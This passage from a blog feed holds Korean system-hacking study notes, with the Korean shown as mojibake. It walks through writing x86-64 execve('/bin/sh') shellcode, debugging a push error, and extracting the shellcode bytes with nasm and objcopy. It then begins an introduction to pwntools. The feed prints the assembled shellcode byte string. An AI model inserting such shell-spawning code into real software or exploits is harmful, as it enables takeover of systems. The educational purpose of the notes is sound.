  &lt;li&gt;execve ëª…ë ¹ì–´ê°€ ì…¸ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— ì´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ë§Œ ìˆë‹¤ë©´ í•´ë‹¹ ì‹œìŠ¤í…œì˜ ì œì–´ ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆê²Œ ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;ìµœì‹ ì˜ ë¦¬ëˆ…ìŠ¤ê°€ ì‚¬ìš©í•˜ëŠ” ê¸°ë³¸ ì…¸ í”„ë¡œê·¸ë¨ì€ sh, bashì´ë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;execvebinsh-null-null&quot;&gt;execve(â€/bin/shâ€, null, null)&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;execve ì½”ë“œëŠ” ì˜¤ë¡œì§€ execve ì‹œìŠ¤í…œ ì½œë§Œìœ¼ë¡œ êµ¬ì„±ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;execveë¥¼ ì‹¤í–‰í•œ í”„ë¡œê·¸ë¨ì´ execveê°€ ì‹¤í–‰í•œ í”„ë¡œê·¸ë¨ìœ¼ë¡œ ëŒ€ì²´ëœë‹¤. (ì™„ì „íˆ ë®ì–´ì”Œì›Œì§„ë‹¤-OSì—ì„œ ë°°ìš¸ ìˆ˜ ìˆë‹¤)&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;execve system call format&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0Â (rdi)&lt;/th&gt;
          &lt;th&gt;arg1Â (rsi)&lt;/th&gt;
          &lt;th&gt;arg2Â (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;execve&lt;/td&gt;
          &lt;td&gt;0x3b&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;const char *const *argv&lt;/td&gt;
          &lt;td&gt;const char *const *envp&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;linux execve manual&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;arg1: ì‹¤í–‰í•  í”„ë¡œê·¸ë¨ì˜ path&lt;/li&gt;
      &lt;li&gt;arg2: ì‹¤í–‰ë  í”„ë¡œê·¸ë¨ì—ê²Œ ì¸ìë¡œ ë„˜ê²¨ì§ˆ ìŠ¤íŠ¸ë§ë“¤ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ë“¤ì˜ ë°°ì—´&lt;/li&gt;
      &lt;li&gt;arg3: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key=value&lt;/code&gt; í˜•ì‹ìœ¼ë¡œ ì‹¤í–‰ë  í”„ë¡œê·¸ë¨ì—ê²Œ ë„˜ê²¨ì§ˆ í™˜ê²½ ë³€ìˆ˜.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì´ë²ˆ ì‹¤ìŠµì—ì„œëŠ” shë§Œ ì‹¤í–‰í•˜ë©´ ë˜ê¸° ë•Œë¬¸ì— arg2, arg3ëŠ” ì‹ ê²½ì“°ì§€ ì•ŠëŠ”ë‹¤. ë‹¤ë§Œ arg2ì™€ arg3ë¥¼ ë¬´ì‹œí•˜ëŠ” ì¡°ê±´ì´ ì—†ê¸° ë•Œë¬¸ì— arg2, arg3ëŠ” NULLë¡œ ì±„ì›Œ ì¤€ë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì…¸ì½”ë“œëŠ” ë¬´ì—‡ì¼ê¹Œ? í•œ ë²ˆ ì‘ì„±í•´ ë³´ì•˜ë‹¤. â€˜/bin/shâ€™ ë¬¸ìì—´ì€ &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;ì§ì „ í¬ìŠ¤íŠ¸ì—ì„œ&lt;/a&gt; ë°°ì› ë˜ pwntoolsì˜ unpacking í•¨ìˆ˜ë¥¼ ì´ìš©í•´ little endianì˜ hexë¡œ ë³€í™˜í–ˆë‹¤.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;push 0x68732f6e69622f ; 7byteì´ë¯€ë¡œ immediate dataë¡œ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤.
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ì´ì œ ì•ì—ì„œ ì§„í–‰í–ˆë˜ ì‹¤ìŠµì²˜ëŸ¼ C ì–¸ì–´ë¡œ ìŠ¤ì¼ˆë ˆí†¤ ì½”ë“œë¥¼ ë§Œë“¤ê³  ê·¸ ì•ˆì— execve ì‹¤í–‰ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ íƒ‘ì¬í•´ ì»´íŒŒì¼ í›„ ì‹¤í–‰í•´ ë³´ì.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;.global run_sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;run_sh:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;push 0x68732f6e69622f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rsi, rsi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rdx, rdx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;xor rdi, rdi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%203.jpeg&quot; alt=&quot;ê±°ì§“ë§ì²˜ëŸ¼ ì—ëŸ¬ê°€ ë–´ë‹¤.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ê±°ì§“ë§ì²˜ëŸ¼ ì—ëŸ¬ê°€ ë–´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì•„ë‹ˆ ëŒ€ì²´â€¦ pushì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆëŠ” operand typeì´ ì•„ë‹ˆë€ë‹¤. ëŒ€ì²´ ì™œì¸ì§€ ì•Œì•„ë³´ì•˜ë‹¤. ê·¸ë¬ë”ë‹ˆ ì¶©ê²©ì ì¸ ì‚¬ì‹¤ì„ ì•Œê²Œ ë˜ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;pushê°€ í•œ ë²ˆ ì‹¤í–‰ë  ë•Œ operandì— ì˜¤ëŠ” ê°’ì€ ì¼ë°˜ì ìœ¼ë¡œ ì£¼ì†Œë¥¼ ìƒì •í•œë‹¤. ì¦‰, íŠ¹ì • ê°’ì„ ì§ì ‘ ë„£ëŠ” ê²Œ ì•„ë‹ˆë¼ íŠ¹ì • ê°’ì˜ í¬ì¸í„°ë¥¼ ë„£ëŠ” ê²ƒì´ pushì˜ ëŒ€ì „ì œì˜€ë˜ ê²ƒì´ë‹¤. ê·¸ë˜ì„œ immediate valueë¥¼ ìŠ¤íƒì— ë„£ëŠ” ê²ƒì€ ê¶Œì¥ë˜ì§€ ì•ŠëŠ” ë°©ì‹ì´ì—ˆê³ , ì–´ë–¤ ê°’ì„ ë‹¤ë¥¸ ë©”ëª¨ë¦¬ ì£¼ì†Œë‚˜ ë ˆì§€ìŠ¤í„°ì— ë„£ì–´ë‘” í›„ ìŠ¤íƒì— ë°ì´í„°ê°€ ìˆëŠ” ìœ„ì¹˜ë¥¼ push í•˜ëŠ” ê²ƒì´ conventionì´ì—ˆë‹¤. ë˜í•œ í˜„ì¬ ì‚¬ìš©í•œ ì–´ì…ˆë¸”ëŸ¬ì—ì„œ í—ˆìš©í•˜ëŠ” pushì˜ operandì˜ ìµœëŒ€ ê¸¸ì´ëŠ” 32bitì˜€ë‹¤. (ì¼ë°˜ì ì¸ ì–´ì…ˆë¸”ëŸ¬ê°€ ê·¸ë ‡ê¸° ë•Œë¬¸ì— ì´ ì ì€ ì¶”ì¸¡í–ˆë‹¤)&lt;/p&gt;

&lt;p&gt;ê¶ê¸ˆí•´ì„œ ë°ì´í„°ë¥¼ 8bitì”© ë‚˜ëˆ„ì–´ ë„£ì–´ ë³´ì•˜ë‹¤. ê·¸ ê²°ê³¼, gdbë¥¼ í†µí•´ ì•„ë˜ì™€ ê°™ì€ ì‹¤í–‰ í˜„í™©ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%204.jpeg&quot; alt=&quot;ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ì•„ë†”&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ì•„ë†”&lt;/p&gt;

&lt;p&gt;ë“¤ì–´ê°€ê¸´ ë“¤ì–´ê°„ë‹¤. ê·¸ë ‡ì§€ë§Œ ë‚´ê°€ ì˜ë„í•˜ëŠ” ìŠ¤íŠ¸ë§ìœ¼ë¡œ ì¸ì‹ë˜ì§€ëŠ” ì•ŠëŠ”ë‹¤!!!!!&lt;/p&gt;

&lt;p&gt;ì‹¤ì œë¡œ ë¬¸ìì—´ì˜ ì‹œì‘ ì£¼ì†Œê°€ ë“¤ì–´ê°€ê²Œ ë§Œë“¤ì–´ ë‘” rdiì˜ ê°’ì„ í™•ì¸í•´ ë³´ë‹ˆ ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%205.jpeg&quot; alt=&quot;ì˜ë¼ì„œ ì¸ì‹í•œë‹¤!!!!!!!!!!!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì˜ë¼ì„œ ì¸ì‹í•œë‹¤!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;ì˜ë¼ì„œ ì¸ì‹í•œë‹¤. ë¨¸ë¦¬ê°€ ë‚˜ì˜ë©´ ì†ë°œì´ ê³ ìƒí•œë‹¤ëŠ” ê²©ì–¸ì„ ê²½í—˜ì ìœ¼ë¡œ ì¦ëª…í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ëˆ„êµ°ê°€ê°€ í•˜ì§€ ì•ŠëŠ” ë°ì—” ì´ìœ ê°€ ìˆëŠ” ë²•ì„ì„ ëª…ì‹¬í•˜ì.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;push 0x68732f6e69622f\n&quot;&lt;/code&gt; ë¥¼ ì•„ë˜ì™€ ê°™ì´ ë³€ê²½í•˜ê³  ì»´íŒŒì¼í–ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x68732f6e69622f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push rax&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìµìŠ¤í”Œë¡œì‡ì— ì„±ê³µí•  ìˆ˜ ìˆì—ˆë‹¤. ì•„ì´ê¸°ë».&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;objdumpë¥¼-ì´ìš©í•œ-shellcode-ì¶”ì¶œ&quot;&gt;objdumpë¥¼ ì´ìš©í•œ shellcode ì¶”ì¶œ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±í•œ ì…¸ì½”ë“œë¥¼ byte codeë¡œ ë³€í™˜í•˜ëŠ” ê³¼ì •ì´ë‹¤.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;nasmì´ë¼ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì„¤ì¹˜í•´ ì§„í–‰í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apt-get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.asm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;ì§ì „ì˜ execveì— ì‚¬ìš©í–ˆë˜ ì…¸ì½”ë“œë¥¼ ë…ë¦½ì ì¸ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¡œ ì‘ì„±í•  ìˆ˜ ìˆê²Œ ìˆ˜ì •í•´ execve.asmìœ¼ë¡œ ì €ì¥í–ˆë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ìœ„ ì»¤ë§¨ë“œë¥¼ ì‹¤í–‰í•œ ê²°ê³¼(elf í˜•ì‹ì˜ ì˜¤ë¸Œì íŠ¸ ì½”ë“œë¡œ ë³€í™˜ëœ ëŒ€ìƒ ì½”ë“œì˜ ë¤í”„ë¥¼ ëœ¬ ê²°ê³¼):&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì´ë ‡ê²Œ ìƒì„±í•œ ì˜¤ë¸Œì íŠ¸ ì½”ë“œë¥¼ ì´ì œ ì •ë§ë¡œ ë°”ì´íŠ¸ ì½”ë“œë¡œ ë°”ê¿”ì£¼ê³ , í•´ë‹¹ ì½”ë“œì˜ ë‚´ìš©ì„ í„°ë¯¸ë„ì— í‘œì‹œí•œë‹¤.&lt;/p&gt;

        &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dump-section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xxd:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;íŒŒì¼ì˜&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ë‚´ìš©ì„&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ì§„ìˆ˜ë¡œ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ë³´ì—¬ì¤€ë‹¤&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;

        &lt;p&gt;ê·¸ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì€ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆê³ , ì¶œë ¥ ë‚´ìš©ì˜ í¬ë§·ì„ ì—†ì• ëŠ” ì˜µì…˜ì„ ë‹¬ì•„ ë‹¹ì¥ ë³µì‚¬í•´ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” hex ê°’ì„ ì¶œë ¥í•˜ë„ë¡ í•˜ê¸°ë„ í–ˆë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;ì¦‰, execve.bin ì‰˜ì½”ë“œì˜ ë°”ì´ë„ˆë¦¬ ê°’ì€&lt;/p&gt;

        &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;â€œ\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05â€&lt;/code&gt;&lt;/p&gt;

        &lt;p&gt;ì˜€ë‹¤.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 20 Jul 2022 19:24:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step4</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step4</guid>
      </item>
    
      <item>
        <title>System Hackig Step 3-2</title>
        <description>&lt;h1 id=&quot;stage-3-2&quot;&gt;STAGE 3-2&lt;/h1&gt;

&lt;h1 id=&quot;tool-pwntools&quot;&gt;Tool: PwnTools&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;íŒŒì´ì¬ì„ ì´ìš©í•´ ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•  ë•Œ, ìì£¼ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ë“¤ì´ ìˆìŒ. ì˜ˆì‹œ) ë¦¬í‹€ ì—”ë””ì–¸ â†”Â ë¹… ì—”ë””ì–¸ì„ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜&lt;/li&gt;
  &lt;li&gt;ì´ëŸ° í•¨ìˆ˜ë“¤ì„ ë¯¸ë¦¬ êµ¬í˜„í•´ ë‘” ëª¨ë“ˆì„ ë§Œë“¦ â†’ â€˜pwntoolsâ€™ì˜ íƒ„ìƒ&lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ëŒ€ë¶€ë¶„ì´ pwntoolsë¥¼ ì´ìš©í•´ ì œì‘ë˜ê³  ê³µìœ ë˜ë¯€ë¡œ ë°˜ë“œì‹œ ì•Œì•„ ë‘¬ì•¼ í•¨.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì„¤ì¹˜ ë°©ë²•ì€ ìƒëµí•œë‹¤. ì¸í„°ë„·ì— ê²€ìƒ‰í•˜ë©´ ë‚˜ì˜¤ê¸° ë•Œë¬¸ì—â€¦&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pwntools-api-ì‚¬ìš©ë²•&quot;&gt;PwnTools API ì‚¬ìš©ë²•&lt;/h1&gt;

&lt;p&gt;ê³µì‹ ë§¤ë‰´ì–¼: &lt;a href=&quot;http://docs.pwntools.com/en/latest/&quot;&gt;ì—¬ê¸°!&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ìš”ì¦˜ì€ ë§¤ë‰´ì–¼í™”ê°€ ì˜ ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— ì–´ë–¤ ëª¨ë“ˆì„ ë‹¤ìš´ë°›ìœ¼ë©´ ê·¸ ëª¨ë“ˆì˜ ë§¤ë‰´ì–¼ë¶€í„° ì–¼ì¶” ìˆ™ì§€í•´ ë‘ëŠ” ê±¸ ì¶”ì²œí•œë‹¤. ë³´í†µì€ ì˜ì–´ë¡œ ë˜ì–´ ìˆìœ¼ë¯€ë¡œ íŒŒíŒŒê³ ë¥¼ ì“°ê±°ë‚˜, ì˜ì–´ ì‹¤ë ¥ì„ ëŠ˜ë ¤ì„œ ì–¸ì–´ ì¥ë²½ì„ ë‚®ì¶”ëŠ” ê²Œ ì¢‹ë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ê¸°ì—ì„œëŠ” ìì£¼ ì‚¬ìš©ë˜ëŠ” ëª‡ëª‡ í•¨ìˆ˜ë§Œ ê°„ëµíˆ ì†Œê°œí•œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;1-process--remote&quot;&gt;1. process &amp;amp; remote&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process&lt;/code&gt; ë¥¼ ì´ìš©í•´ ì „ë‹¬í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote&lt;/code&gt; ë¥¼ í†µí•´ì„œë„ ì „ë‹¬ ë° ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;process [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes/processes.html&quot;&gt;ìì„¸í•œ ì„¤ëª…&lt;/a&gt;]
    &lt;ul&gt;
      &lt;li&gt;ë¡œì»¬ ë°”ì´ë„ˆë¦¬ë¥¼ ëŒ€ìƒìœ¼ë¡œ ìµìŠ¤í”Œë¡œì‡ì„ í…ŒìŠ¤íŠ¸í•˜ê³  ë””ë²„ê¹…í•  ë•Œ ì‚¬ìš©í•œë‹¤.&lt;/li&gt;
